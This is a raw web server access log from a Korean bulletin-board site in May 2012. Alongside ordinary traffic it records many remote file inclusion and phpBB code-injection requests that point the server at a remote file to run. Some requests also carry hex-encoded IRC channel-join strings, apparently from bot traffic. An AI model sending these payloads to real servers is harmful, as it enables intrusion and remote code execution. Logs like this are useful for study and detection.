211.39.150.195 - - [03/May/2012:00:21:33 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2862&month=3 HTTP/1.1" 200 40891
124.2.44.105 - - [03/May/2012:00:22:14 +0900] "GET /rg4_board/view.php?bbs_code=open_3&bd_num=2778 HTTP/1.0" 200 26822
211.39.150.195 - - [03/May/2012:00:22:30 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2330 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:22:34 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2863&month=6 HTTP/1.1" 200 41378
211.39.150.195 - - [03/May/2012:00:23:39 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2861&month=3 HTTP/1.1" 200 235
124.2.44.105 - - [03/May/2012:00:23:55 +0900] "GET /rg4_board/view.php?bbs_code=open_4&bd_num=2691 HTTP/1.0" 200 26829
211.39.150.195 - - [03/May/2012:00:24:13 +0900] "GET %4a%4f%49%4e%20%23%21%21%72%78%21%21%20%0d%0a/rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2332 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:24:39 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2863&month=10 HTTP/1.1" 200 41229
211.39.150.195 - - [03/May/2012:00:25:42 +0900] "GET /main/index.php?bbs_code=schedule&month=11&year=2863 HTTP/1.1" 200 33107
211.39.150.195 - - [03/May/2012:00:25:56 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2333 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:26:44 +0900] "GET /main/index.php?bbs_code=schedule&month=7&year=2865 HTTP/1.1" 200 33129
211.39.150.195 - - [03/May/2012:00:27:30 +0900] "GET /rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=3200&mode=reply HTTP/1.1" 200 205
211.39.150.195 - - [03/May/2012:00:27:38 +0900] "GET /rg4_board/view.php?&bbs_code=class_gallary&ss%5Bcat%5D=&page=1&bd_num=2335 HTTP/1.1" 200 217
211.39.150.195 - - [03/May/2012:00:27:43 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2861&month=5 HTTP/1.1" 200 235
61.247.204.38 - - [03/May/2012:00:27:55 +0900] "GET /rg4_data/board/02989_902_0.file HTTP/1.1" 200 1847856
211.39.150.195 - - [03/May/2012:00:28:49 +0900] "GET /main/index.php?bbs_code=schedule&month=12&year=2862 HTTP/1.1" 200 33139
127.0.0.1 - - [03/May/2012:00:29:02 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:29:02 +0900] "GET %32%32%30%20%57%65%6c%63%6f%6d%65%20%54%6f%20%46%74%70%44%61%65%6d%6f%6e%2e%2e%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2412 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:29:21 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=4&bd_num=2799 HTTP/1.1" 200 205
211.39.150.195 - - [03/May/2012:00:29:48 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2861&month=12 HTTP/1.1" 200 41194
211.39.150.195 - - [03/May/2012:00:30:53 +0900] "GET /robots.txt HTTP/1.1" 404 302
211.39.150.195 - - [03/May/2012:00:30:53 +0900] "GET /main/index.php?bbs_code=schedule&month=3&year=2863 HTTP/1.1" 200 33129
124.2.44.105 - - [03/May/2012:00:30:55 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2416 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:31:03 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=4&bd_num=2889 HTTP/1.1" 200 205
61.247.204.38 - - [03/May/2012:00:31:29 +0900] "GET /rg4_board/down.php?bbs_code=open_1&bd_num=2189&key=0&mode=down&page=4 HTTP/1.1" 200 19968
127.0.0.1 - - [03/May/2012:00:31:51 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:31:54 +0900] "GET /main/index.php?bbs_code=schedule&month=5&year=2863 HTTP/1.1" 200 33129
127.0.0.1 - - [03/May/2012:00:31:57 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:32:11 +0900] "GET /?printertopic=1&amp%3bt=2447&amp%3bstart=0&amp%3bpostdays=0&amp%3bpostorder=asc&amp%3bvote=viewresult//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:32:13 +0900] "GET /?printertopic=1&amp%3bt=2447&amp%3bstart=0&amp%3bpostdays=0&amp%3bpostorder=asc&amp%3bvote=viewresult//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:32:15 +0900] "GET /?printertopic=1&amp%3bt=2447&amp%3bstart=0&amp%3bpostdays=0&amp%3bpostorder=asc&amp%3bvote=viewresult//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:00:32:33 +0900] "GET /rg4_board/view.php?bbs_code=open_1&bd_num=3162&page=3 HTTP/1.1" 200 28098
211.39.150.195 - - [03/May/2012:00:32:46 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=4&bd_num=2946 HTTP/1.1" 200 205
211.39.150.195 - - [03/May/2012:00:32:52 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2863&month=9 HTTP/1.1" 200 41336
124.2.44.105 - - [03/May/2012:00:33:10 +0900] "GET %4a%4f%49%4e%20%23%64%64%20%64%70%61%73%73%0d%0a/rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2418 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:33:14 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:17 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:18 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:29 +0900] "GET /?printertopic=1&amp%3bt=8474&amp%3bstart=0&amp%3bpostdays=0&amp%3bpostorder=asc&amp%3bvote=viewresult//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:31 +0900] "GET /?printertopic=1&amp%3bt=8474&amp%3bstart=0&amp%3bpostdays=0&amp%3bpostorder=asc&amp%3bvote=viewresult//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:32 +0900] "GET /?printertopic=1&amp%3bt=8474&amp%3bstart=0&amp%3bpostdays=0&amp%3bpostorder=asc&amp%3bvote=viewresult//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:37 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:47 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:49 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:51 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:33:54 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:33:59 +0900] "GET /rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=3345&mode=modify HTTP/1.1" 200 9355
127.0.0.1 - - [03/May/2012:00:34:00 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:34:01 +0900] "GET /main/index.php?bbs_code=schedule&month=6&year=2864 HTTP/1.1" 200 33095
127.0.0.1 - - [03/May/2012:00:34:05 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:34:07 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:34:10 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:34:14 +0900] "GET /rg4_board/view.php?bbs_code=management&bd_num=3509 HTTP/1.0" 200 26513
127.0.0.1 - - [03/May/2012:00:34:17 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:34:19 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:34:24 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:34:29 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=4&bd_num=2947 HTTP/1.1" 200 205
211.39.150.195 - - [03/May/2012:00:34:58 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2862&month=6 HTTP/1.1" 200 235
124.2.44.105 - - [03/May/2012:00:35:03 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2420 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:00:35:17 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2423 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:35:20 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:35:21 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:35:24 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:35:27 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:35:27 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:35:29 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:36:05 +0900] "GET /main/index.php?bbs_code=schedule&month=9&year=2864 HTTP/1.1" 200 33097
66.249.69.170 - - [03/May/2012:00:36:12 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=1&bd_num=2737 HTTP/1.1" 200 205
127.0.0.1 - - [03/May/2012:00:36:25 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:36:26 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:36:28 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:37:02 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2429 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:37:05 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2864&month=7 HTTP/1.1" 200 41183
127.0.0.1 - - [03/May/2012:00:37:09 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:37:10 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:37:12 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:37:18 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:37:29 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:37:33 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:37:39 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2455 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:00:37:48 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2456 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:37:54 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=4&bd_num=3012 HTTP/1.1" 200 205
211.39.150.195 - - [03/May/2012:00:38:00 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2860&month=12 HTTP/1.1" 200 235
124.2.44.105 - - [03/May/2012:00:38:11 +0900] "GET /robots.txt HTTP/1.0" 404 302
124.2.44.105 - - [03/May/2012:00:38:13 +0900] "GET /rg4_board/print.php?bbs_code=class_free&bd_num=3439 HTTP/1.0" 404 311
124.2.44.105 - - [03/May/2012:00:39:02 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2461 HTTP/1.0" 200 206
124.2.44.105 - - [03/May/2012:00:39:09 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2462 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:39:13 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:39:16 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
66.249.69.170 - - [03/May/2012:00:39:17 +0900] "GET /rg4_board/view.php?bbs_code=&bd_num=3727&year=2862&month=9 HTTP/1.1" 200 235
127.0.0.1 - - [03/May/2012:00:39:19 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:39:37 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=2&bd_num=2109 HTTP/1.1" 200 205
124.2.44.105 - - [03/May/2012:00:39:46 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2463 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:40:09 +0900] "GET /rg4_board/view.php?bbs_code=schedule&bd_num=3727&year=2862&month=11 HTTP/1.1" 200 41356
127.0.0.1 - - [03/May/2012:00:40:16 +0900] "GET /?name=Shout_Box//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:40:18 +0900] "GET /?name=Shout_Box//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:40:21 +0900] "GET /?name=Shout_Box//modules/Forums/admin/admin_words.php%3fphpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.35 - - [03/May/2012:00:40:21 +0900] "GET %4a%4f%49%4e%20%23%64%6e%73%36%20%02%02%02%02%0d%0a/rg4_board/down.php?bbs_code=kind+character&bd_num=1601&key=0&mode=down HTTP/1.1" 200 10644
127.0.0.1 - - [03/May/2012:00:40:28 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:40:27 +0900] "GET /rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=3433&mode=modify HTTP/1.1" 200 9355
127.0.0.1 - - [03/May/2012:00:40:30 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:40:32 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:40:40 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:40:41 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:40:43 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.35 - - [03/May/2012:00:40:51 +0900] "GET /rg4_board/view.php?bbs_code=open_6&bd_num=1409&page=3 HTTP/1.1" 200 27804
127.0.0.1 - - [03/May/2012:00:40:58 +0900] "GET /?name=Forums//modules/Forums/admin/admin_words.php%3fphpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:41:00 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:41:01 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:41:02 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:41:04 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:41:05 +0900] "GET / HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:41:19 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=2&bd_num=1765 HTTP/1.1" 200 205
61.247.204.37 - - [03/May/2012:00:41:41 +0900] "GET /rg4_board/view.php?bbs_code=open_5&bd_num=213&page=2 HTTP/1.1" 200 21270
211.39.150.195 - - [03/May/2012:00:41:43 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D4%26year%3D2862 HTTP/1.1" 200 10469
61.247.204.39 - - [03/May/2012:00:41:55 +0900] "GET /rg4_board/view.php?bbs_code=open_3&bd_num=457&page=3 HTTP/1.1" 200 22322
211.39.150.195 - - [03/May/2012:00:43:02 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=1&bd_num=2126 HTTP/1.1" 200 205
124.2.44.105 - - [03/May/2012:00:43:04 +0900] "GET /rg4_board/view.php?bbs_code=management&bd_num=2290 HTTP/1.0" 200 26473
211.39.150.195 - - [03/May/2012:00:43:15 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D8%26year%3D2864 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:44:05 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:44:09 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:44:10 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:44:10 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:44:12 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:44:12 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:44:13 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:44:13 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:44:18 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2468 HTTP/1.0" 200 206
211.39.150.195 - - [03/May/2012:00:44:45 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=2&bd_num=2119 HTTP/1.1" 200 205
211.39.150.195 - - [03/May/2012:00:44:52 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D2%26year%3D2862 HTTP/1.1" 200 10469
124.2.44.105 - - [03/May/2012:00:45:20 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2469 HTTP/1.0" 200 206
61.247.204.37 - - [03/May/2012:00:45:24 +0900] "GET /rg4_board/down.php?bbs_code=management&bd_num=3651&key=0&mode=down HTTP/1.1" 200 10752
124.2.44.105 - - [03/May/2012:00:45:44 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2475 HTTP/1.0" 200 206
61.247.204.35 - - [03/May/2012:00:45:41 +0900] "GET %4a%4f%49%4e%20%23%64%6e%73%39%20%02%02%02%02%0d%0a/rg4_board/view.php?bbs_code=open_7&bd_num=4012 HTTP/1.1" 200 67065
211.39.150.195 - - [03/May/2012:00:46:27 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=2&bd_num=2123 HTTP/1.1" 200 205
211.39.150.195 - - [03/May/2012:00:46:30 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D1%26year%3D2862 HTTP/1.1" 200 10469
211.39.150.195 - - [03/May/2012:00:46:55 +0900] "GET /rg4_board/write.php?&bbs_code=class_free&page=1&bd_num=3437&mode=reply HTTP/1.1" 200 9355
124.2.44.105 - - [03/May/2012:00:46:58 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2476 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:47:17 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:47:20 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:47:22 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:48:10 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=2&bd_num=2124 HTTP/1.1" 200 205
127.0.0.1 - - [03/May/2012:00:48:10 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
211.39.150.195 - - [03/May/2012:00:48:10 +0900] "GET /rg4_member/find_pass.php?url=%2Fmain%2Findex.php%3Fbbs_code%3Dschedule%26month%3D10%26year%3D2864 HTTP/1.1" 200 10469
127.0.0.1 - - [03/May/2012:00:48:11 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:48:15 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:48:20 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:48:22 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:48:24 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
61.247.204.36 - - [03/May/2012:00:49:45 +0900] "GET /rg4_board/slide.php?bbs_code=action&bd_num=2858 HTTP/1.1" 404 311
127.0.0.1 - - [03/May/2012:00:49:55 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:49:58 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:49:57 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:49:59 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:50:00 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:50:01 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:50:01 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:50:02 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:50:05 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
124.2.44.105 - - [03/May/2012:00:50:06 +0900] "GET /rg4_board/view.php?&bbs_code=class_free&page=16&bd_num=2477 HTTP/1.0" 200 206
127.0.0.1 - - [03/May/2012:00:50:10 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:50:11 +0900] "GET /?phpbb_root_path=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:51:36 +0900] "GET /?start=20120410&amp%3bsid=a29f75de7da60b28857e2fc3c4e94a2c//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:51:37 +0900] "GET /?start=20120410&amp%3bsid=a29f75de7da60b28857e2fc3c4e94a2c//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:51:40 +0900] "GET /?start=20120410&amp%3bsid=a29f75de7da60b28857e2fc3c4e94a2c//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:51:51 +0900] "GET /?phpbb_root_path=test%3f%3f HTTP/1.1" 200 1456
61.247.204.37 - - [03/May/2012:00:51:50 +0900] "GET /rg4_board/down.php?bbs_code=open_1&bd_num=3063&key=0&mode=down&page=3 HTTP/1.1" 200 28672
127.0.0.1 - - [03/May/2012:00:51:52 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:51:54 +0900] "GET /?start=20120410&amp%3bsid=a29f75de7da60b28857e2fc3c4e94a2c%2522%2520class=%2522resultLink//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=test%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:51:55 +0900] "GET / HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:51:56 +0900] "GET /?start=20120410&amp%3bsid=a29f75de7da60b28857e2fc3c4e94a2c%2522%2520class=%2522resultLink//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
127.0.0.1 - - [03/May/2012:00:52:08 +0900] "GET /?start=20120410&amp%3bsid=a29f75de7da60b28857e2fc3c4e94a2c%2522%2520class=%2522resultLink//html&highlight=%252527.include($_GET%5ba%5d),exit.%252527&a=http://www.kriko-car.hu/e107_images/fileinspector/banner.jpg%3f%3f%3f HTTP/1.1" 200 1456
